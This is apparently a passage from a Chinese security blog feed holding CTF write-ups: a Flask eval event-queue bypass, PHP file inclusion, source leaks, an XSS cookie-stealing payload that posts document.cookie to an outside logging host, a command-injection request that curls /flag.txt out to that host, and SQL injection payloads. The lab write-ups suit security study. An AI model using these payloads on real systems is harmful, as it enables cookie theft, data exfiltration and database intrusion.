class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line"><span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">trigger_event(<span class="string">'action:view;index'</span>)</span><br></pre></td></tr></table></figure><p> 但是如果按代码正常的逻辑来看，<code>num_items</code>的默认字段值为0，需要用session中的另一个字段<code>points</code>的值来换取，然而<code>points</code>初始化值为3</p><p>这是<code>session</code>中字段的初始化的代码段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">querystring = urllib.unquote(request.query_string)</span><br><span class="line">request.event_queue = []</span><br><span class="line"><span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">session[<span class="string">'log'</span>] = []</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这是<code>num_items</code>和<code>points</code>字段值交换的代码段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">num_items = int(args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">session[<span class="string">'points'</span>] -= point_to_consume</span><br></pre></td></tr></table></figure><p>一开始认为的思路是修改session值来改变num_items，points字段的值来执行该函数。在flask中，session是经过参数app.secret_key来进行加密的，所以我们还必须得到加密的key，才能伪造session以获取flag，而获取该key则必须通过参数对代码进行注入，得到<code>app.secret_key</code></p><p>找出的可能存在的注入点在<code>buy_handler</code>函数，通过python3的格式化字符format存在的漏洞注入得到配置信息，但是服务器端对用户的输入存在白名单过滤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br></pre></td></tr></table></figure><p>故该方法无效，其实这题只是考察单纯绕过代码逻辑来调用<code>get_flag_handler</code>函数，我们可以注意，服务器执行的函数取决点在于列表<code>request.event_queue</code>，只要列表<code>request.event_queue</code>中还有事件，就会通过<code>eval</code>函数执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">ret_val = event_handler(args)</span><br></pre></td></tr></table></figure><p>而列表<code>request.event_queue</code>是通过函数<code>trigger_event</code>进行改变的，所以我们可以通过调用<code>trigger_event</code>函数来进行多函数调用</p><p>按照正常的逻辑而言，如果我们正常调用<code>buy_handler</code>函数，并且传入的参数为5，payload为：<code>?action:buy;5</code>执行到最后会执行语句<code>trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])</code>，这时候事情列表<code>request.event_queue</code>中就会添加两个事件<code>consume_point_function</code>和<code>view_handler</code>，也就是说，接下来调用的函数必然是<code>consume_point_function</code>，执行到该函数中的判断语句<code>if session[&#39;points&#39;] &lt; point_to_consume: raise RollBackException()</code>时，由于<code>session[&#39;points&#39;]</code>小于5，则出现了报错信息</p><p>但是如果我们控制事件列表<code>request.event_queue</code>中的事件顺序为：<code>buy_handler,get_flag_handler,comsume_point_function</code>，那么由于<code>buy_handler</code>函数中的语句<code>session[&#39;num_items&#39;] += num_items</code>，此时<code>session[&#39;num_items&#39;]</code>被设置为了5，执行下一个函数<code>get_flag_handler</code>时，就能成功执行语句：<code>if session[&#39;num_items&#39;] &gt;= 5:trigger_event(&#39;func:show_flag;&#39; + FLAG())</code></p><p>所以最终的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure><p>首先调用的函数是<code>trigger_event</code>，注意到这里的<code>%23</code>即<code>#</code>，在python的<code>eval</code>函数中，注释符同样能注释掉后面的语句，也就是说注释掉了后面的字符串<code>_handler</code>或<code>_fuction</code>，测试如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">print(<span class="string">"hello"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = eval(<span class="string">'hello#aaa'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a()</span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>传入<code>trigger_event</code>的参数为列表<code>[action:buy;5,action:get_flag;]</code>，函数执行完毕后，此时事件列表<code>request.event_queue</code>的内容为：<code>[action:buy;5,action:get_flag;]</code></p><p>下一个调用函数为：<code>buy_handler</code>，传入的参数为5，此时事件列表<code>request.event_queue</code>的内容为：<code>[action:get_flag;]</code>，当函数<code>buy_handler</code>执行到语句<code>trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])</code>时，事件列表中又添了新的事件，此时内容为：<code>[action:get_flag;,func:consume_point;5,action:view;index]</code></p><p>那么下一个调用的函数便为<code>get_flag</code>，因为此时刚执行完函数<code>buy_handler</code>，<code>session[&#39;num_items&#39;] == 5</code>，所以执行语句<code>trigger_event(&#39;func:show_flag;&#39; + FLAG())</code>，此时事件列表中又添加了新的内容：<code>fuction:show_flag;</code>拼接上<code>FLAG()</code>函数执行结果</p><p>我们可以执行到<code>trigger_event</code>函数中的语句：<code>session[&#39;log&#39;].append(event)</code>，即<code>session[&#39;log&#39;]</code>字段中存储着每次新添加进来的事件，所以必然有<code>FLAG()</code>函数执行结果</p><p>所以最后我们需要解密<code>session</code>字段，通过下列脚本代码解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ddctf\12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解密结果中获得flag，从<code>log</code>字段内容也验证之前的过程分析</p><p>最终的flag为：<code>DDCTF{3v4l_3v3nt_100p_aNd_fLASK_cOOkle}</code></p>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>杭州&quot;西湖论剑&quot;ctf-Web</title>
    <link href="https://Foxgrin.github.io//posts/42277/"/>
    <id>https://Foxgrin.github.io//posts/42277/</id>
    <published>2019-04-11T07:15:00.000Z</published>
    <updated>2019-04-11T15:19:27.619Z</updated>
    
    <content type="html"><![CDATA[<p>这场比赛打了个酱油，只解了3题。意识到自己还需更加努力学习，趁着平台再次开放，复现一下Web的三道题<a id="more"></a></p><h4 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h4><p>题目链接：<a href="http://61.164.47.198:10000/" target="_blank" rel="noopener">http://61.164.47.198:10000/</a> </p><p>页面直接给出了提示<code>include $_GET[&#39;file&#39;]</code>，是一个文件包含题目</p><p>利用PHP伪协议读取<code>index.php</code>经过base64加密后的源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span> (!$a) &#123;</span><br><span class="line">$a = <span class="string">'./templates/index.html'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--hint: ZGlyLnBocA== --&gt;</span><br></pre></td></tr></table></figure><p>源代码又给出了提示<code>hint:ZGlyLnBocA==</code>，base64解密后得到<code>dir.php</code></p><p>继续用伪协议读<code>dir.php</code>的源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?file=php://filter/convert.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure><p>发现读取目录下文件的函数<code>scandir</code>，读取根目录发现flag文件<code>dir.php?dir=/</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/杭州ctf/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再次利用伪协议读取flag文件，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?file=php://filter/convert.base64-encode/resource=/ffffflag_1s_Her4</span><br></pre></td></tr></table></figure><p>解密后获得flag：<code>flag{8dc25fd21c52958f777ce92409e2802a}</code></p><h4 id="猜猜flag是什么"><a href="#猜猜flag是什么" class="headerlink" title="猜猜flag是什么"></a>猜猜flag是什么</h4><p>题目链接：<a href="http://61.164.47.198:10002/" target="_blank" rel="noopener">http://61.164.47.198:10002</a> </p><p><img src="/img/杭州ctf/2.png" alt=""></p><p>一开始通过GET方式提交参数<code>name</code>，发现页面会返回我们输入的参数<code>name</code>的值，尝试了一下XSS，<code>?name=%253cscript%253e%253c/script%253e</code>，弹出了<code>hint:e10adc3949ba59abbe56e057f20f883e</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/杭州ctf/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>md5解密是123456，但是一直没懂这个提示的意思，用御剑扫后台也没有扫到什么有用的</p><p>比赛结束后，参考别人的WP发现这题就是路径泄露</p><p>首先，通过<code>dirsearch</code>工具扫描目录，该工具下载链接：<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/杭州ctf/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>扫描到<code>/.DS_Store</code></p><p>再通过<code>ds_store_exp</code>工具进行还原，该工具下载链接：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/杭州ctf/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还原结果发现存在目录<code>/e10adc3949ba59abbe56e057f20f883e</code>，即前面发现的提示</p><p>访问<code>/e10adc3949ba59abbe56e057f20f883e/.git</code>，发现存在git文件泄露，使用<code>githack</code>工具还原</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/杭州ctf/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还原后发现压缩包<code>BackupForMySite.zip</code>，但是被加密，发现里面存在<code>lengzhu.jpg</code>，得知这是一个明文攻击</p><p>先将<code>lengzhu.jpg</code>通过2345好压压缩为<code>lengzhu.zip</code>，再与<code>BackupForMySite.zip</code>通过<code>ARCHPR</code>工具进行明文攻击，</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/杭州ctf/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>进行解密一段时间后，虽然没有得到解压密码，但是得到解压后的压缩包</p><p>解压后得到<code>hint</code>内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code is 9faedd5999937171912159d28b219d86</span><br><span class="line">well ok ur good...By the way, flag saved in flag/seed.txt</span><br></pre></td></tr></table></figure><p>看到<code>code</code>想到了首页的code兑换码，于是访问<code>/?code=9faedd5999937171912159d28b219d86</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/杭州ctf/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>得到一个数字：<code>4795334</code>，看样子不像是flag</p><p><code>hint</code>中还有内容<code>flag saved in flag/seed.txt</code>，但是访问<code>/flag/seed.txt</code>也没有得到flag</p><p>但是看到seed就想到了这是一个随机数，需要工具<code>php_mt_seed</code>进行破解，该工具下载链接：<a href="https://www.openwall.com/php_mt_seed/，下载解压后进入目录执行`make`得到`php_mt_seed`" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/，下载解压后进入目录执行`make`得到`php_mt_seed`</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/杭州ctf/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解密后的结果逐一尝试</p><p>访问<code>/flag/309551.txt</code>得到flag：<code>flag{0730b6193000e9334b12cf7c95fbc736}</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/杭州ctf/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h4 id="breakout"><a href="#breakout" class="headerlink" title="breakout"></a>breakout</h4><p>题目链接：<a href="http://61.164.47.198:10001/" target="_blank" rel="noopener">http://61.164.47.198:10001</a> </p><p>题目一开始为登录页面，但是完全不需要输入任何用户名和密码即可登录，登录后，有三个页面：<code>/main.php</code>为留言页面；<code>/report.php</code>为提交URL页面，提交完成后管理员会访问；<code>/exec.php</code>为命令执行页面，但是只有管理员才可以执行命令</p><p>题目思路挺明确的，利用留言页面进行XSS注入，再提交留言页面的URL，窃取到管理员的cookie，最后执行命令获取flag</p><p>首先在留言页面进行XSS注入，通过测试后台将<code>script</code>替换成<code>:)</code>，所以考虑用img标签的onerror事件，将<code>空格+onerror=</code>替换成了<code>:)</code>，绕过方法是将<code>onerror</code>和<code>=</code>之间换行，注入内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror</span><br><span class="line">=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/杭州ctf/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功执行弹框，那么接下来只要控制onerror事件内容即可将管理员cookie发送到自己的服务器，payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror</span><br><span class="line">=&quot;var img = new Image();img.src=&apos;http://fw5can.ceye.io/?c=&apos;+document.cookie;&quot;&gt;</span><br></pre></td></tr></table></figure><p>当管理员访问<code>/main.php</code>时，触发onerror事件后就会将自己的cookie值提交到我们的服务器上，我们即可在服务器的日志信息上发现</p><p>接下来，需要在<code>/report.php</code>中提交<code>/main.php</code>页面的URL值，但是这里必须同时要提交正确的验证码，验证码的条件为：<code>substr(md5($str), 0, 6) === xxxxxx</code>，即我们提交的验证码经过md5加密后的前六位为指定的随机6位数字，因为每次访问页面，产生的6位数字都不同，所以需要通过脚本进行提交，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode(encoding=<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">"http://61.164.47.198:10001/report.php"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=s3dp9m5qpg6f10138g99bnt1p7; token=1B2M2Y8AsgTpgAmY7PhCfg%3D%3D'</span></span><br><span class="line">    &#125;</span><br><span class="line">r = s.get(url,headers=headers)</span><br><span class="line">code = re.findall(<span class="string">r'=== (.*)&lt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print("code:",code)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9999999</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(str(i)).startswith(code):</span><br><span class="line">        <span class="comment">#print("md5(str(i)) ==",md5(str(i)))</span></span><br><span class="line">        <span class="comment">#print("i:",i)</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'url'</span>:<span class="string">'http://61.164.47.198:10001/main.php'</span>,</span><br><span class="line">    <span class="string">'code'</span>:i</span><br><span class="line">    &#125;</span><br><span class="line">r2 = s.post(url,data=data,headers=headers)</span><br><span class="line">r2.encoding = r2.apparent_encoding</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/杭州ctf/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>运行后可以看到页面返回提交成功的信息</p><p>接下来，回到自己服务器，查看日志内容：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/杭州ctf/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到管理员的cookie值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20admin=admin_!@@!_admin_admin_hhhhh;</span><br></pre></td></tr></table></figure><p>最后，来到命令执行<code>exec.php</code>页面，提交执行的命令，加上管理员的cookie，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /exec.php HTTP/1.1</span><br><span class="line">Host: 61.164.47.198:10001</span><br><span class="line">Content-Length: 78</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://61.164.47.198:10001</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://61.164.47.198:10001/exec.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=s3dp9m5qpg6f10138g99bnt1p7; token=1B2M2Y8AsgTpgAmY7PhCfg%3D%3D;admin=admin_!@@!_admin_admin_hhhhh;</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">command=curl http://fw5can.ceye.io/?$(cat /flag.txt | base64)&amp;exec=1</span><br></pre></td></tr></table></figure><p>再次访问日志，经过base64解密后获取flag值：<code>flag{fa51320ae808c70485dd5f30337026d6}</code></p>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ringzer0ctf-sql注入</title>
    <link href="https://Foxgrin.github.io//posts/52899/"/>
    <id>https://Foxgrin.github.io//posts/52899/</id>
    <published>2019-04-09T11:15:00.000Z</published>
    <updated>2019-04-09T13:21:41.429Z</updated>
    
    <content type="html"><![CDATA[<p>拿这个平台练手一下SQL注入<a id="more"></a></p><h4 id="Most-basic-SQLi-pattern"><a href="#Most-basic-SQLi-pattern" class="headerlink" title="Most basic SQLi pattern."></a>Most basic SQLi pattern.</h4><p>没有过滤，万能密码直接登录获取flag，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=1&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h4 id="ACL-rulezzz-the-world"><a href="#ACL-rulezzz-the-world" class="headerlink" title="ACL rulezzz the world."></a>ACL rulezzz the world.</h4><p>没有过滤，联合查询注入</p><p>注数据库payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0&apos; union select database(),2,3#</span><br></pre></td></tr></table></figure><p>数据库名：<code>chal2</code></p><p>注表payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0&apos; union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure><p> 表名：<code>c2_group,c2_group_membership,c2_user</code></p><p>注列payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0&apos; union select group_concat(column_name),2,3 from information_schema.columns where table_name=&apos;c2_group&apos;#</span><br></pre></td></tr></table></figure><p>注内容payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0&apos; union select group_concat(id),group_concat(groupname),group_concat(description) from c2_group#</span><br></pre></td></tr></table></figure><p>flag在表<code>c2_group</code>中</p><h4 id="Login-portal-1"><a href="#Login-portal-1" class="headerlink" title="Login portal 1"></a>Login portal 1</h4><p>用户名和密码字段都过滤了注释符<code>#</code>，<code>-</code>，<code>%3B%00</code></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; or &apos;1&amp;password=1</span><br></pre></td></tr></table></figure><h4 id="Random-Login-Form"><a href="#Random-Login-Form" class="headerlink" title="Random Login Form"></a>Random Login Form</h4><p>有注册和登录界面，猜测是SQL约束攻击</p><p>注册payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 